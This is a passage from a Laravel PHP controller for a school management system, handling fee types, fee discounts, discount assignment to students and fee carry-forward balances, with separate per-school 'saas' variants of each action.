                    return ApiBaseMethod::sendResponse(null, 'Fees type has been updated successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    return redirect('fees-type')->with('message-success', 'Fees type has been updated successfully');
                } else {
                    return redirect()->back()->with('message-danger', 'Something went wrong, please try again');
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_fees_type_update(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'name' =>  'required|max:50|unique:aramisc_fees_types,name,' . $request->id,
            'fees_group' => "required|",
            'school_id' => "required"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $fees_type = AramiscFeesType::where('school_id',$request->school_id)->find($request->id);
            $fees_type->name = $request->name;
            $fees_type->fees_group_id = $request->fees_group;
            $fees_type->description = $request->description;
            $fees_type->school_id = $request->school_id;
            $result = $fees_type->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Fees type has been updated successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    return redirect('fees-type')->with('message-success', 'Fees type has been updated successfully');
                } else {
                    return redirect()->back()->with('message-danger', 'Something went wrong, please try again');
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function fees_type_delete(Request $request, $id)
    {
        try {
            $id_key = 'fees_type_id';

            $tables = tableList::getTableList($id_key,$id);

            try {
                $delete_query = AramiscFeesType::destroy($id);
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($delete_query) {
                        return ApiBaseMethod::sendResponse(null, 'Fees Type has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        return redirect()->back()->with('message-success-delete', 'Fees Type has been deleted successfully');
                    } else {
                        return redirect()->back()->with('message-danger-delete', 'Something went wrong, please try again');
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return redirect()->back()->with('message-danger-delete', 'Something went wrong, please try again');
        }
    }
    public function saas_fees_type_delete(Request $request, $school_id, $id)
    {
        try {
            $id_key = 'fees_type_id';

            $tables = tableList::getTableList($id_key,$id);

            try {
                $delete_query = AramiscFeesType::where('school_id',$school_id)->where('id',$id)->delete();
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($delete_query) {
                        return ApiBaseMethod::sendResponse(null, 'Fees Type has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        return redirect()->back()->with('message-success-delete', 'Fees Type has been deleted successfully');
                    } else {
                        return redirect()->back()->with('message-danger-delete', 'Something went wrong, please try again');
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return redirect()->back()->with('message-danger-delete', 'Something went wrong, please try again');
        }
    }
    public function fees_discount_index(Request $request)
    {

        try {
            $fees_discounts = AramiscFeesDiscount::get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($fees_discounts, null);
            }

            return view('backEnd.feesCollection.fees_discount', compact('fees_discounts'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_fees_discount_index(Request $request,$school_id)
    {

        try {
            $fees_discounts = AramiscFeesDiscount::where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($fees_discounts, null);
            }

            return view('backEnd.feesCollection.fees_discount', compact('fees_discounts'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function fees_discount_store(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'name' => "required|max:200|unique:aramisc_fees_discounts",
            'code' => "required|unique:aramisc_fees_discounts",
            'amount' => "required|integer|min:0"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $fees_discount = new AramiscFeesDiscount();
            $fees_discount->name = $request->name;
            $fees_discount->code = $request->code;
            $fees_discount->type = $request->type;
            $fees_discount->amount = $request->amount;
            $fees_discount->description = $request->description;
            $result = $fees_discount->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Fees discount has been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    return redirect()->back()->with('message-success', 'Fees discount has been created successfully');
                } else {
                    return redirect()->back()->with('message-danger', 'Something went wrong, please try again');
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_fees_discount_store(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'name' => "required|max:200|unique:aramisc_fees_discounts",
            'code' => "required|unique:aramisc_fees_discounts",
            'amount' => "required|integer|min:0",
            'school_id' => "required"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $fees_discount = new AramiscFeesDiscount();
            $fees_discount->name = $request->name;
            $fees_discount->code = $request->code;
            $fees_discount->type = $request->type;
            $fees_discount->amount = $request->amount;
            $fees_discount->description = $request->description;
            $fees_discount->school_id = $request->school_id;
            $result = $fees_discount->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Fees discount has been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    return redirect()->back()->with('message-success', 'Fees discount has been created successfully');
                } else {
                    return redirect()->back()->with('message-danger', 'Something went wrong, please try again');
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function fees_discount_edit(Request $request, $id)
    {

        try {
            $fees_discount = AramiscFeesDiscount::find($id);
            $fees_discounts = AramiscFeesDiscount::get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['fees_discount'] = $fees_discount->toArray();
                $data['fees_discounts'] = $fees_discounts->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.feesCollection.fees_discount', compact('fees_discounts', 'fees_discount'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_fees_discount_edit(Request $request, $school_id, $id)
    {

        try {
            $fees_discount = AramiscFeesDiscount::where('school_id',$school_id)->find($id);
            $fees_discounts = AramiscFeesDiscount::where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['fees_discount'] = $fees_discount->toArray();
                $data['fees_discounts'] = $fees_discounts->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.feesCollection.fees_discount', compact('fees_discounts', 'fees_discount'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function fees_discount_update(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'name' => "required|max:200|unique:aramisc_fees_discounts,name," . $request->id,
            'code' => "required|unique:aramisc_fees_discounts,code," . $request->id,
            'amount' => "required|integer|min:0"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $fees_discount = AramiscFeesDiscount::find($request->id);
            $fees_discount->name = $request->name;
            $fees_discount->code = $request->code;
            $fees_discount->type = $request->type;
            $fees_discount->amount = $request->amount;
            $fees_discount->description = $request->description;
            $result = $fees_discount->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Fees discount has been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    return redirect('fees-discount')->with('message-success', 'Fees discount has been updated successfully');
                } else {
                    return redirect()->back()->with('message-danger', 'Something went wrong, please try again');
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_fees_discount_update(Request $request,$school_id)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'name' => "required|max:200|unique:aramisc_fees_discounts,name," . $request->id,
            'code' => "required|unique:aramisc_fees_discounts,code," . $request->id,
            'amount' => "required|integer|min:0",
            'school_id' => "required",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $fees_discount = AramiscFeesDiscount::where('school_id',$school_id)->find($request->id);
            $fees_discount->name = $request->name;
            $fees_discount->code = $request->code;
            $fees_discount->type = $request->type;
            $fees_discount->amount = $request->amount;
            $fees_discount->description = $request->description;
            $fees_discount->school_id = $request->school_id;
            $result = $fees_discount->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Fees discount has been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    return redirect('fees-discount')->with('message-success', 'Fees discount has been updated successfully');
                } else {
                    return redirect()->back()->with('message-danger', 'Something went wrong, please try again');
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function fees_discount_delete(Request $request, $id)
    {

        try {
            $id_key = 'fees_discount_id';

            $tables = tableList::getTableList($id_key,$id);

            try {
                $delete_query = AramiscFeesDiscount::destroy($request->id);
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($delete_query) {
                        return ApiBaseMethod::sendResponse(null, 'Fees Discount has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        return redirect()->back()->with('message-success-delete', 'Fees Discount has been deleted successfully');
                    } else {
                        return redirect()->back()->with('message-danger-delete', 'Something went wrong, please try again');
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return redirect()->back()->with('message-danger-delete', 'Something went wrong, please try again');
        }
    }
    public function saas_fees_discount_delete(Request $request, $school_id, $id)
    {

        try {
            $id_key = 'fees_discount_id';

            $tables = tableList::getTableList($id_key,$id);

            try {
                $delete_query = AramiscFeesDiscount::where('school_id',$school_id)->destroy($request->id);
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($delete_query) {
                        return ApiBaseMethod::sendResponse(null, 'Fees Discount has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        return redirect()->back()->with('message-success-delete', 'Fees Discount has been deleted successfully');
                    } else {
                        return redirect()->back()->with('message-danger-delete', 'Something went wrong, please try again');
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return redirect()->back()->with('message-danger-delete', 'Something went wrong, please try again');
        }
    }
    public function feesDiscountAssign(Request $request, $id)
    {

        try {
            $fees_discount_id = $id;
            $classes = AramiscClass::where('active_status', 1)->get();
            $genders = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '1')->get();
            $categories = AramiscStudentCategory::all();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['fees_discount_id'] = $fees_discount_id;
                $data['classes'] = $classes->toArray();
                $data['genders'] = $genders->toArray();
                $data['categories'] = $categories->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.feesCollection.fees_discount_assign', compact('classes', 'categories', 'genders', 'fees_discount_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_feesDiscountAssign(Request $request, $school_id, $id)
    {

        try {
            $fees_discount_id = $id;
            $classes = AramiscClass::where('active_status', 1)->where('school_id',$school_id)->get();
            $genders = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '1')->where('school_id',$school_id)->get();
            $categories = AramiscStudentCategory::where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['fees_discount_id'] = $fees_discount_id;
                $data['classes'] = $classes->toArray();
                $data['genders'] = $genders->toArray();
                $data['categories'] = $categories->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.feesCollection.fees_discount_assign', compact('classes', 'categories', 'genders', 'fees_discount_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function feesDiscountAssignSearch(Request $request)
    {


        try {
            $classes = AramiscClass::where('active_status', 1)->get();
            $genders = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '1')->get();
            $categories = AramiscStudentCategory::all();
            $fees_discount_id = $request->fees_discount_id;
            $students = AramiscStudent::query();
            $students->where('active_status', 1);
            if ($request->class != "") {
                $students->where('class_id', $request->class);
            }
            if ($request->section != "") {
                $students->where('section_id', $request->section);
            }
            if ($request->category != "") {
                $students->where('student_category_id', $request->category);
            }
            if ($request->gender != "") {
                $students->where('gender_id', $request->gender);
            }
            $students = $students->get();

            $fees_discount = AramiscFeesDiscount::find($request->fees_discount_id);

            $pre_assigned = [];
            foreach ($students as $student) {
                $assigned_student = AramiscFeesAssignDiscount::select('student_id')->where('student_id', $student->id)->where('fees_discount_id', $request->fees_discount_id)->first();

                if ($assigned_student != "") {
                    if (!in_array($assigned_student->student_id, $pre_assigned)) {
                        $pre_assigned[] = $assigned_student->student_id;
                    }
                }
            }

            $class_id = $request->class;
            $category_id = $request->category;
            $gender_id = $request->gender;


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['categories'] = $categories->toArray();
                $data['genders'] = $genders->toArray();
                $data['students'] = $students->toArray();
                $data['fees_discount'] = $fees_discount;
                $data['fees_discount_id'] = $fees_discount_id;
                $data['pre_assigned'] = $pre_assigned;
                $data['class_id'] = $class_id;
                $data['category_id'] = $category_id;
                $data['gender_id'] = $gender_id;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.feesCollection.fees_discount_assign', compact('classes', 'categories', 'genders', 'students', 'fees_discount', 'fees_discount_id', 'pre_assigned', 'class_id', 'category_id', 'gender_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_feesDiscountAssignSearch(Request $request, $school_id)
    {

        try {
            $classes = AramiscClass::where('active_status', 1)->where('school_id',$school_id)->get();
            $genders = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '1')->where('school_id',$school_id)->get();
            $categories = AramiscStudentCategory::where('school_id',$school_id)->get();
            $fees_discount_id = $request->fees_discount_id;
            $students = AramiscStudent::query();
            $students->where('active_status', 1);
            if ($request->class != "") {
                $students->where('class_id', $request->class);
            }
            if ($request->section != "") {
                $students->where('section_id', $request->section);
            }
            if ($request->category != "") {
                $students->where('student_category_id', $request->category);
            }
            if ($request->gender != "") {
                $students->where('gender_id', $request->gender);
            }
            $students = $students->get();

            $fees_discount = AramiscFeesDiscount::where('school_id',$school_id)->find($request->fees_discount_id);

            $pre_assigned = [];
            foreach ($students as $student) {
                $assigned_student = AramiscFeesAssignDiscount::select('student_id')->where('student_id', $student->id)->where('fees_discount_id', $request->fees_discount_id)->first();

                if ($assigned_student != "") {
                    if (!in_array($assigned_student->student_id, $pre_assigned)) {
                        $pre_assigned[] = $assigned_student->student_id;
                    }
                }
            }

            $class_id = $request->class;
            $category_id = $request->category;
            $gender_id = $request->gender;



            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['categories'] = $categories->toArray();
                $data['genders'] = $genders->toArray();
                $data['students'] = $students->toArray();
                $data['fees_discount'] = $fees_discount;
                $data['fees_discount_id'] = $fees_discount_id;
                $data['pre_assigned'] = $pre_assigned;
                $data['class_id'] = $class_id;
                $data['category_id'] = $category_id;
                $data['gender_id'] = $gender_id;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.feesCollection.fees_discount_assign', compact('classes', 'categories', 'genders', 'students', 'fees_discount', 'fees_discount_id', 'pre_assigned', 'class_id', 'category_id', 'gender_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function feesDiscountAssignStore(Request $request)
    {


        try {

            foreach ($request->students as $student) {
                $assign_discount = AramiscFeesAssignDiscount::where('fees_discount_id', $request->fees_discount_id)->where('student_id', $student)->delete();
            }

            if ($request->checked_ids != "") {
                foreach ($request->checked_ids as $student) {
                    $assign_discount = new AramiscFeesAssignDiscount();
                    $assign_discount->student_id = $student;
                    $assign_discount->fees_discount_id = $request->fees_discount_id;
                    $assign_discount->save();
                }
            } else {
                return response()->json(['no' => 'fail'], 200);
            }
            $html = "";

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($html, null);
            }
            return response()->json([$html]);
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_feesDiscountAssignStore(Request $request, $school_id)
    {


        try {

            foreach ($request->students as $student) {
                $assign_discount = AramiscFeesAssignDiscount::where('fees_discount_id', $request->fees_discount_id)->where('student_id', $student)->where('school_id',$school_id)->delete();
            }

            if ($request->checked_ids != "") {
                foreach ($request->checked_ids as $student) {
                    $assign_discount = new AramiscFeesAssignDiscount();
                    $assign_discount->student_id = $student;
                    $assign_discount->fees_discount_id = $request->fees_discount_id;
                    $assign_discount->school_id = $school_id;
                    $assign_discount->save();
                }
            } else {
                return response()->json(['no' => 'fail'], 200);
            }
            $html = "";

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($html, null);
            }
            return response()->json([$html]);
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function feesGenerateModal(Request $request,$school_id, $amount, $student_id, $type)
    {
        try {
            $amount = $amount;
            $fees_type_id = $type;
            $student_id = $student_id;
            $discounts = AramiscFeesAssignDiscount::where('student_id', $student_id)->where('school_id',$school_id)->get();

            $applied_discount = [];
            foreach ($discounts as $fees_discount) {
                $fees_payment = AramiscFeesPayment::select('fees_discount_id')->where('fees_discount_id', $fees_discount->id)->where('school_id',$school_id)->first();
                if (isset($fees_payment->fees_discount_id)) {
                    $applied_discount[] = $fees_payment->fees_discount_id;
                }
            }


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['amount'] = $amount;
                $data['discounts'] = $discounts;
                $data['fees_type_id'] = $fees_type_id;
                $data['student_id'] = $student_id;
                $data['applied_discount'] = $applied_discount;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.feesCollection.fees_generate_modal', compact('amount', 'discounts', 'fees_type_id', 'student_id', 'applied_discount'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function feesDiscountAmountSearch(Request $request)
    {

        try {
            $html = $request->fees_discount_id;
            $discount_amount = AramiscFeesAssignDiscount::find($request->fees_discount_id);
            $html = $discount_amount->feesDiscount->amount;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($html, null);
            }
            return response()->json([$html]);
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_feesDiscountAmountSearch(Request $request, $school_id)
    {

        try {
            $html = $request->fees_discount_id;
            $discount_amount = AramiscFeesAssignDiscount::where('school_id',$school_id)->find($request->fees_discount_id);
            $html = $discount_amount->feesDiscount->amount;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($html, null);
            }
            return response()->json([$html]);
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function feesPaymentDelete(Request $request)
    {
        try {
            $result = AramiscFeesPayment::destroy($request->id);

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Fees payment has been deleted  successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_feesPaymentDelete(Request $request, $school_id)
    {
        try {
            $result = AramiscFeesPayment::where('school_id',$school_id)->where('id',$request->id)->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Fees payment has been deleted  successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function feesForward(Request $request)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.feesCollection.fees_forward', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_feesForward(Request $request, $school_id)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.feesCollection.fees_forward', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function feesForwardSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required',
            'section' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $students = AramiscStudent::where('class_id', $request->class)->where('section_id', $request->section)->get();
            if ($students->count() != 0) {
                foreach ($students as $student) {
                    $fees_balance = AramiscFeesCarryForward::where('student_id', $student->id)->count();
                }

                $class_id = $request->class;

                if ($fees_balance == 0) {

                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        $data = [];
                        $data['classes'] = $classes->toArray();
                        $data['students'] = $students->toArray();
                        $data['class_id'] = $class_id;
                        return ApiBaseMethod::sendResponse($data, null);
                    }
                    return view('backEnd.feesCollection.fees_forward', compact('classes', 'students', 'class_id'));
                } else {
                    $update = "";

                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        $data = [];
                        $data['classes'] = $classes->toArray();
                        $data['students'] = $students->toArray();
                        $data['class_id'] = $class_id;
                        $data['update'] = $update;
                        return ApiBaseMethod::sendResponse($data, null);
                    }
                    return view('backEnd.feesCollection.fees_forward', compact('classes', 'students', 'update', 'class_id'));
                }
            } else {

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendError('No result Found');
                }
                Toastr::error('Operation Failed', 'Failed');
                return redirect('fees-forward');
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_feesForwardSearch(Request $request, $school_id)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required',
            'section' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            $students = AramiscStudent::where('class_id', $request->class)->where('section_id', $request->section)->where('school_id',$school_id)->get();
            if ($students->count() != 0) {
                foreach ($students as $student) {
                    $fees_balance = AramiscFeesCarryForward::where('student_id', $student->id)->where('school_id',$school_id)->count();
                }

                $class_id = $request->class;

                if ($fees_balance == 0) {

                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        $data = [];
                        $data['classes'] = $classes->toArray();
                        $data['students'] = $students->toArray();
                        $data['class_id'] = $class_id;
                        return ApiBaseMethod::sendResponse($data, null);
                    }
                    return view('backEnd.feesCollection.fees_forward', compact('classes', 'students', 'class_id'));
                } else {
                    $update = "";

                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        $data = [];
                        $data['classes'] = $classes->toArray();
                        $data['students'] = $students->toArray();
                        $data['class_id'] = $class_id;
                        $data['update'] = $update;
                        return ApiBaseMethod::sendResponse($data, null);
                    }
                    return view('backEnd.feesCollection.fees_forward', compact('classes', 'students', 'update', 'class_id'));
                }
            } else {

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendError('No result Found');
                }
                Toastr::error('Operation Failed', 'Failed');
                return redirect('fees-forward');
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function fees_Forward(Request $request)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.feesCollection.fees_forward', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_fees_Forward(Request $request, $school_id)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.feesCollection.fees_forward', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function feesForwardStore(Request $request)
    {
        DB::beginTransaction();
        try {
            foreach ($request->id as $student) {

                if ($request->update == 1) {

                    $fees_forward = AramiscFeesCarryForward::find($student);
                    $fees_forward->balance = $request->balance[$student];
                    $fees_forward->save();
                } else {
                    $fees_forward = new AramiscFeesCarryForward();
                    $fees_forward->student_id = $student;
                    $fees_forward->balance = $request->balance[$student];
                    $fees_forward->save();
                }
            }
            DB::commit();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse(null, 'Fees has been forwarded successfully');
            }
            Toastr::success('Operation successful', 'Success');
            return redirect('fees-forward');
        } catch (\Exception $e) {
            DB::rollback();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Something went wrong, please try again.');
            }
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_feesForwardStore(Request $request, $school_id)
    {
        DB::beginTransaction();
        try {
            foreach ($request->id as $student) {

                if ($request->update == 1) {

                    $fees_forward = AramiscFeesCarryForward::where('school_id',$school_id)->find($student);
                    $fees_forward->balance = $request->balance[$student];
                    $fees_forward->save();
                } else {
                    $fees_forward = new AramiscFeesCarryForward();
                    $fees_forward->student_id = $student;
                    $fees_forward->balance = $request->balance[$student];
                    $fees_forward->school_id = $school_id;
                    $fees_forward->save();
                }
            }
            DB::commit();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse(null, 'Fees has been forwarded successfully');
            }
            Toastr::success('Operation successful', 'Success');
            return redirect('fees-forward');
        } catch (\Exception $e) {
